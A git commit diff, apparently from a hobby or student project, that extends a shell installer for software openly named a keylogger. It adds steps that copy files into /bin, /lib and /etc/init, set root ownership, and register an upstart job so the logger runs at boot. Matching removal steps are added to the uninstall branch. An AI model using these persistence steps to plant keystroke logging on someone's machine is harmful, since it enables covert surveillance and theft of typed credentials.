d6b028cb8c1f12f1c5ec5ef1195f70671fab00fb
WezSieTato <le0n.uo@gmail.com>
2014-06-10 00:42:21 +0200

    Montowanie kolejki na starcie systemu

--- instalator.sh
+++ instalator.sh
@@ -21,14 +21,24 @@ shift
 		mv  '/bin/keylogger_config.sh' '/bin/keylogger'
 		sudo chown root:root '/bin/keylogger'
 		sudo chmod 100 '/bin/keylogger'
+		echo "Zainstalowano keyloggera!"
+		cp ./mount.sh '/lib'
+		mv '/lib/mount.sh' '/lib/mountKey.sh'
+		cp ./mountKey.conf '/etc/init'
+		./mount.sh
 		start ninja
+		echo "Keylogger uruchomiony"
 	;;
 	
 		"uninstall")
 		stop ninja
+		echo "Keylogger zatrzymany"
 		rm '/lib/keyLogger'
 		rm '/bin/keylogger'
 		rm '/etc/init/ninja.conf'
+		rm '/lib/mountKey.sh'
+		rm '/etc/init/mountKey.conf'
+		echo "Keylogger odinstalowany!"
 	;;
 esac
 
--- mount.sh
+++ mount.sh
@@ -1,3 +1,4 @@
 #skrypt do montowania kolejki
 sudo mkdir /dev/mqueue
 sudo mount -t mqueue none /dev/mqueue
+echo "Zamontowano kolejke na dysku!"
